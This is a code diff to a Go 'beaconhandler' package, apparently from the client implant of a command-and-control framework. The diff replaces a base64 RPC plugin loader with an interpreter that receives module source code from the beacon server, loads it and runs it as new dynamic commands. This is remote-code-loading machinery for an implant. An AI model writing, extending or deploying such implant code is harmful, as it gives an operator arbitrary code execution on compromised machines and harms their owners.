@@ -1,7 +1,6 @@
 package beaconhandler
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"strings"
@@ -9,8 +8,8 @@ import (
 	httpFuncs "src/Client/beacon/http"
 	"src/Client/generic/commands"
 	"src/Client/generic/config"
+	"src/Client/generic/interpreter_client"
 	"src/Client/generic/logger"
-	"src/Client/generic/rpc_client"
 )
 
 // commandHandlerFunc defines the signature for command handlers.
@@ -55,15 +54,13 @@ func init() {
 			logger.Error(fmt.Sprintf("Failed to unmarshal module command data: %v. Data: %s", err, string(cmd.Data)))
 			return "Error: Malformed data for 'module' command: " + err.Error(), false
 		}
-		decodedData, err := base64.StdEncoding.DecodeString(moduleData.Data)
-		if err != nil {
-			logger.Error(fmt.Sprintf("Failed to base64 decode module data: %v", err))
-			return "Error: Failed to base64 decode module data: " + err.Error(), false
-		}
-		if err := rpc_client.LoadDynamicCommandFromBeacon(moduleData.Name, decodedData); err != nil {
-			logger.Error(fmt.Sprintf("Failed to load %s plugin: %v", moduleData.Name, err))
+
+		// Load interpreted source code
+		if err := interpreter_client.LoadDynamicCommandSource(moduleData.Name, moduleData.Data); err != nil {
+			logger.Error(fmt.Sprintf("Failed to load %s module: %v", moduleData.Name, err))
 			return fmt.Sprintf("Error loading module %s: %v", moduleData.Name, err), false
 		}
+
 		return fmt.Sprintf("Module %s loaded successfully", moduleData.Name), false
 	}
 }
@@ -90,10 +87,10 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 	handler, exists := handlers[command.Command]
 	if exists {
 		outputMsg, switchSession = handler(command, commandData)
-	} else if rpc_client.HasCommand(command.Command) {
+	} else if interpreter_client.HasCommand(command.Command) {
 		logger.Log(fmt.Sprintf("Executing dynamic command: '%s'", command.Command))
 		var err error
-		outputMsg, err = rpc_client.ExecuteFromBeacon(command.Command, []string{}, commandData)
+		outputMsg, err = interpreter_client.ExecuteFromBeacon(command.Command, []string{}, commandData)
 		if err != nil {
 			outputMsg = fmt.Sprintf("Error executing %s: %v", command.Command, err)
 		}
